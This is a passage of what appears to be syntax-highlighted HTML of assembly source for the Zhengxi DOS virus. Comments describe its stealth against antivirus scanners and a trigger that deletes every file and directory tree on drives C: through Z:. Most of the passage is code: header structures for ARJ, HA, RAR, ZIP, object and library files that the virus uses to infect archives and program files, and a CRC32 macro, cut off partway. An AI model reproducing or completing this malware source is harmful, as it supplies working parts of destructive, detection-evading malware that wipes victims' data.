</span><span class="sc1">; with the original  one. While reading the header of an infected file, the</span><span class="sc0">
</span><span class="sc1">; virus restores and brings it in its original form.</span><span class="sc0">
</span><span class="sc1">;                            </span><span class="sc0">
</span><span class="sc1">; The virus doesn't stealth 100% on int 25h level, of course. There are se-</span><span class="sc0">
</span><span class="sc1">; veral ways to bypass  this stealth routine. But if some antivirus program</span><span class="sc0">
</span><span class="sc1">; reads the file contents  via int 21h DOS functions, then it reads the di-</span><span class="sc0">
</span><span class="sc1">; rectory structure  and then the file contents  by absolute int 25h calls,</span><span class="sc0">
</span><span class="sc1">; and Zhengxi remains completely invisible.</span><span class="sc0">
</span><span class="sc1">;          </span><span class="sc0">
</span><span class="sc1">;                         </span><span class="sc0">
</span><span class="sc1">; Trigger routine  </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                     </span><span class="sc0">
</span><span class="sc1">; If while processing a ZIP file Zhengxi finds  some record packed with the</span><span class="sc0">
</span><span class="sc1">; "stored" method, it checks the ZIP file  date and time stamp. If the year</span><span class="sc0">
</span><span class="sc1">; of last modification of that file is 1996 or above, Zhengxi will look for</span><span class="sc0">
</span><span class="sc1">; all the files  of all the directories on all the disks (from C: till Z:),</span><span class="sc0">
</span><span class="sc1">; and delete them (the files and whole subdirectory tree).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ÄÄ´ Zhengxi code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">; Structure of archive block (low order byte first):</span><span class="sc0">
</span><span class="sc5">arj_hdr_struc</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">arj_header_id</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 0;=EA60  2  header id (comment and local</span><span class="sc0">
                                 </span><span class="sc1">; file) = 0xEA60 or 60000U</span><span class="sc0">
</span><span class="sc5">arj_bas_hdr_size</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 2;=28 ?  2  basic header size (from</span><span class="sc0">
                                 </span><span class="sc1">; 'first_hdr_size' thru 'comment' below)</span><span class="sc0">
                                 </span><span class="sc1">;= first_hdr_size + strlen(filename) + 1</span><span class="sc0">
                                 </span><span class="sc1">;+ strlen(comment) + 1</span><span class="sc0">
                                 </span><span class="sc1">;= 0 if end of archive</span><span class="sc0">
</span><span class="sc5">arj_first_hdr_size</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 4;1E  1  first_hdr_size (up to extra data)</span><span class="sc0">
</span><span class="sc5">arj_ver_num</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 5;06  1  archiver version number</span><span class="sc0">
</span><span class="sc5">arj_min_ver</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 6;01  1  min. archiver version to xtract</span><span class="sc0">
</span><span class="sc5">arj_host_OS</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 7;00  1  host OS (0 = MSDOS, 1 = PRIMOS, </span><span class="sc0">
                                 </span><span class="sc1">; 2 = UNIX, 3 = AMIGA, 4 = MACDOS)</span><span class="sc0">
</span><span class="sc5">arj_flags</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 8;10  1  arj flags (0x01 = GARBLED_FLAG)</span><span class="sc0">
                                 </span><span class="sc1">; indicates passworded file</span><span class="sc0">
                             </span><span class="sc1">;   ; (0x02 = RESERVED)</span><span class="sc0">
                             </span><span class="sc1">;   ; v- no inf.vol.files, detect it as already</span><span class="sc0">
                             </span><span class="sc1">;   ; (0x04 = VOLUME_FLAG)  indicates continued</span><span class="sc0">
                                 </span><span class="sc1">; file to next volume</span><span class="sc0">
                             </span><span class="sc1">;   ; (0x08 = EXTFILE_FLAG) indicates file</span><span class="sc0">
                                 </span><span class="sc1">; starting position field</span><span class="sc0">
                             </span><span class="sc1">;   ; (0x10 = PATHSYM_FLAG) path translated</span><span class="sc0">
</span><span class="sc5">arj_compres_method</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 9;00  1  method (0 = stored, 1 = compressed</span><span class="sc0">
                                 </span><span class="sc1">; most ... 4 compressed fastest)</span><span class="sc0">
</span><span class="sc5">arj_file_type</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; A;00  1  file type (0 = binary, 1 = text</span><span class="sc0">
                                 </span><span class="sc1">; 2 = comment header)</span><span class="sc0">
</span><span class="sc5">arj_reserved</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; B;'Z' 1  reserved</span><span class="sc0">
</span><span class="sc5">arj_file_time</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; C;    4  date time stamp modified</span><span class="sc0">
</span><span class="sc5">arj_file_date</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; E;    4  date time stamp modified</span><span class="sc0">

</span><span class="sc5">arj_compressed_size</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10;    4  compressed size</span><span class="sc0">
</span><span class="sc5">arj_original_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;14;    4  original size</span><span class="sc0">
</span><span class="sc5">arj_CRC32</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;18;    4  original file's CRC</span><span class="sc0">
</span><span class="sc5">arj_entryname_pos</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1C;0   2  entryname position in filename</span><span class="sc0">
</span><span class="sc5">arj_file_access_mode</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1E;0   2  file access mode</span><span class="sc0">
</span><span class="sc5">arj_host_data</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;20;0   2  host data (currently not used)</span><span class="sc0">
                                 </span><span class="sc1">;22;</span><span class="sc0">
</span><span class="sc1">; ?  filename (null-terminated)</span><span class="sc0">
</span><span class="sc1">; ?  comment  (null-terminated)</span><span class="sc0">
</span><span class="sc1">; 4  basic header CRC</span><span class="sc0">
</span><span class="sc1">; 2  1st extended header size (0 if none) = 0</span><span class="sc0">

</span><span class="sc1">; ?  compressed file</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ha_main</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">hasign</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'HA'</span><span class="sc0">
    </span><span class="sc5">filecnt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">ha_file_hdr</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">ha_ver_method</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">; 0</span><span class="sc0">
    </span><span class="sc5">ha_compress_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc5">ha_original_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; 6</span><span class="sc0">
    </span><span class="sc5">ha_CRC32</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; A</span><span class="sc0">
    </span><span class="sc5">ha_file_time</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; E</span><span class="sc0">
    </span><span class="sc5">ha_file_date</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; 10</span><span class="sc0">
    </span><span class="sc5">ha_path</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; '/', '.', '+'        ; 12 db</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                                                </span><span class="sc1">; 14</span><span class="sc0">
    </span><span class="sc5">ha_name</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ha_path</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ha_path</span><span class="sc0">
</span><span class="sc1">;+1      name</span><span class="sc0">
</span><span class="sc1">;+n      00h</span><span class="sc0">
</span><span class="sc1">;+1      length of machine specific information</span><span class="sc0">
</span><span class="sc1">;+1      machine specific information</span><span class="sc0">
</span><span class="sc1">;2,1,20</span><span class="sc0">

</span><span class="sc1">;machine specific information :</span><span class="sc0">

</span><span class="sc1">;0000    type</span><span class="sc0">
</span><span class="sc1">;0001    information</span><span class="sc0">

</span><span class="sc5">rar_main_hdr</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">rar_head_crc</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">rar_head_type</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">73h</span><span class="sc0">
    </span><span class="sc5">rar_head_flags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;                0x01    - Volume attribute (archive volume)</span><span class="sc0">
</span><span class="sc1">;                0x02    - Archive comment present</span><span class="sc0">
</span><span class="sc1">;                0x04    - Archive lock attribute</span><span class="sc0">
</span><span class="sc1">;                0x08    - Solid attribute (solid archive)</span><span class="sc0">
</span><span class="sc1">;                0x10    - Unused</span><span class="sc0">
</span><span class="sc1">;                0x20    - Authenticity information present</span><span class="sc0">
    </span><span class="sc5">rar_head_size</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">rar_reserved1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">rar_reserved2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;Comment block   present if (HEAD_FLAGS &amp; 0x02) != 0</span><span class="sc0">

</span><span class="sc5">rar_file_hdr</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">rar_f_head_crc</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; 0</span><span class="sc0">
    </span><span class="sc5">rar_f_head_type</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">74h</span><span class="sc0">           </span><span class="sc1">; 2</span><span class="sc0">
    </span><span class="sc5">rar_f_head_flags</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; 3</span><span class="sc0">
</span><span class="sc1">;                0x01 - file continued from previous volume</span><span class="sc0">
</span><span class="sc1">;                0x02 - file continued in next volume</span><span class="sc0">
</span><span class="sc1">;                0x04 - file encrypted with password</span><span class="sc0">
</span><span class="sc1">;                0x08 - file comment present</span><span class="sc0">
</span><span class="sc1">;               (HEAD_FLAGS &amp; 0x8000) == 1, because full</span><span class="sc0">
</span><span class="sc1">;               block size is HEAD_SIZE + PACK_SIZE</span><span class="sc0">
    </span><span class="sc5">rar_f_head_size</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; 5</span><span class="sc0">
    </span><span class="sc5">rar_compressed_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; 7</span><span class="sc0">
    </span><span class="sc5">rar_original_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; B</span><span class="sc0">
    </span><span class="sc5">rar_host_os</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; F</span><span class="sc0">
    </span><span class="sc5">rar_crc32</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;10</span><span class="sc0">
    </span><span class="sc5">rar_file_time</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;14</span><span class="sc0">
    </span><span class="sc5">rar_file_date</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;16</span><span class="sc0">
    </span><span class="sc5">rar_req_ver</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">15d</span><span class="sc0">            </span><span class="sc1">;18</span><span class="sc0">
    </span><span class="sc5">rar_method</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">30h</span><span class="sc0">            </span><span class="sc1">;19</span><span class="sc0">
    </span><span class="sc5">rar_fname_size</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;1A</span><span class="sc0">
    </span><span class="sc5">rar_file_attrib</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;1C</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                                         </span><span class="sc1">;20</span><span class="sc0">
</span><span class="sc1">;FILE_NAME       File name - string of NAME_LEN bytes size</span><span class="sc0">
</span><span class="sc1">;Comment block   present if (HEAD_FLAGS &amp; 0x08) != 0</span><span class="sc0">
</span><span class="sc1">;????            Other extra included blocks - reserved for future use</span><span class="sc0">



</span><span class="sc5">zip_local_header</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
       </span><span class="sc5">zip_loc_sign</span><span class="sc0">                         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'PK'</span><span class="sc0">   </span><span class="sc1">;  0</span><span class="sc0">
       </span><span class="sc5">zip_ver_ned_to_extr</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  4</span><span class="sc0">

       </span><span class="sc5">zip_flags</span><span class="sc0">                            </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  6</span><span class="sc0">
       </span><span class="sc5">zip_compression_method</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  8</span><span class="sc0">
       </span><span class="sc5">zip_file_time</span><span class="sc0">                        </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  A</span><span class="sc0">
       </span><span class="sc5">zip_file_date</span><span class="sc0">                        </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  C</span><span class="sc0">

       </span><span class="sc5">zip_crc_32</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  E</span><span class="sc0">
       </span><span class="sc5">zip_compressed_size</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 12</span><span class="sc0">
       </span><span class="sc5">zip_uncompressed_size</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 16</span><span class="sc0">
       </span><span class="sc5">zip_size_fname</span><span class="sc0">                       </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 1A</span><span class="sc0">
       </span><span class="sc5">zip_extra_field_length</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 1C</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                                                    </span><span class="sc1">; 1E</span><span class="sc0">
</span><span class="sc1">;        filename (variable size)</span><span class="sc0">
</span><span class="sc1">;        extra field (variable size)</span><span class="sc0">
</span><span class="sc5">zip_central_header</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
       </span><span class="sc5">zip_centr_sign_</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'PK'</span><span class="sc0">   </span><span class="sc1">;  0</span><span class="sc0">
       </span><span class="sc5">zip_ver_made_by_</span><span class="sc0">                     </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  4</span><span class="sc0">
       </span><span class="sc5">zip_ver_ned_to_extr_</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  6</span><span class="sc0">
       </span><span class="sc5">zip_flags_</span><span class="sc0">                           </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  8</span><span class="sc0">
       </span><span class="sc5">zip_compression_method_</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  A</span><span class="sc0">
       </span><span class="sc5">zip_file_time_</span><span class="sc0">                       </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  C</span><span class="sc0">
       </span><span class="sc5">zip_file_date_</span><span class="sc0">                       </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  E</span><span class="sc0">
       </span><span class="sc5">zip_crc_32_</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 10</span><span class="sc0">
       </span><span class="sc5">zip_compressed_size_</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 14</span><span class="sc0">
       </span><span class="sc5">zip_uncompressed_size_</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 18</span><span class="sc0">
       </span><span class="sc5">zip_size_fname_</span><span class="sc0">                      </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 1C</span><span class="sc0">
       </span><span class="sc5">zip_extra_field_length_</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 1E</span><span class="sc0">
       </span><span class="sc5">zip_file_comment_length_</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 20</span><span class="sc0">
       </span><span class="sc5">zip_disk_number_start_</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 22</span><span class="sc0">
       </span><span class="sc5">zip_intrnl_file_attr_</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 24</span><span class="sc0">
       </span><span class="sc5">zip_extrnl_file_attr_</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 26</span><span class="sc0">
       </span><span class="sc5">zip_rel_off_of_loc_hdr_</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 2A</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                                                    </span><span class="sc1">; 2E</span><span class="sc0">
</span><span class="sc1">;        filename (variable size)</span><span class="sc0">
</span><span class="sc1">;        extra field (variable size)</span><span class="sc0">
</span><span class="sc1">;        file comment (variable size)</span><span class="sc0">

</span><span class="sc5">zip_end_header</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
       </span><span class="sc5">end_file_hdr_sign</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'PK'</span><span class="sc0">   </span><span class="sc1">;  0</span><span class="sc0">
       </span><span class="sc5">num_of_this_disk</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  4</span><span class="sc0">
       </span><span class="sc5">num_of_the_start_disk</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  6</span><span class="sc0">
       </span><span class="sc5">ttl_num_of_ent_on_this_disk</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  8</span><span class="sc0">
       </span><span class="sc5">ttl_num_of_ent_in_the_cent_dir</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  A</span><span class="sc0">
       </span><span class="sc5">size_of_the_central_directory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  C</span><span class="sc0">
       </span><span class="sc5">off_of_strt_of_cent_directory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 10</span><span class="sc0">
       </span><span class="sc5">zipfile_comment_length</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 14</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                                                    </span><span class="sc1">; 16</span><span class="sc0">
</span><span class="sc1">;            zipfile comment (variable size)</span><span class="sc0">


</span><span class="sc5">seg_attr</span><span class="sc0"> </span><span class="sc9">RECORD</span><span class="sc0"> </span><span class="sc5">SA_A</span><span class="sc4">:</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SA_C</span><span class="sc4">:</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SA_B</span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SA_P</span><span class="sc4">:</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">MODEND</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc0">
</span><span class="sc5">SEGDEF</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">098h</span><span class="sc0">
</span><span class="sc5">FIXUPP</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">09Ch</span><span class="sc0">
</span><span class="sc5">LEDATA</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc0">
</span><span class="sc1">;extrn dosseek_cx_0:near</span><span class="sc0">
</span><span class="sc5">objrec</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">rectype</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">recsize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">UNION</span><span class="sc0">
    </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">segattr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">segsize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">ENDS</span><span class="sc0">
    </span><span class="sc9">STRUC</span><span class="sc0">
        </span><span class="sc5">dataidx</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">dataorg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">ENDS</span><span class="sc0">
    </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">LIB_DICTIONARY_ENTRY_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">lib_hdr</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
    </span><span class="sc5">lib_hdr_type</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc5">lib_hdr_recsize</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lib_hdr_dict_offs</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lib_hdr_dict_size</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lib_hdr_flags</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">lib_hdr_padding</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">lib_hdr_padding</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;;MRORW MACRO w1, shval</span><span class="sc0">
</span><span class="sc1">;;PUSHSTATE</span><span class="sc0">
</span><span class="sc1">;;.386</span><span class="sc0">
</span><span class="sc1">;;        dw ((w1 and 0FFFFh) shr (shval and 0Fh)) or ((w1 and 0FFFFh) shl</span><span class="sc0">
</span><span class="sc1">;;           (10h-(shval and 0Fh)))</span><span class="sc0">
</span><span class="sc1">;;POPSTATE</span><span class="sc0">
</span><span class="sc1">;;ENDM</span><span class="sc0">


</span><span class="sc5">CRC32w</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">moreshit</span><span class="sc0">
</span><span class="sc5">PUSHSTATE</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">LOCAL</span><span class="sc0"> </span><span class="sc5">cum_crc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">byt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">suxx</span><span class="sc0">
    </span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
    </span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">_byt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">moreshit</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_byt</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFFFh</span><span class="sc0">
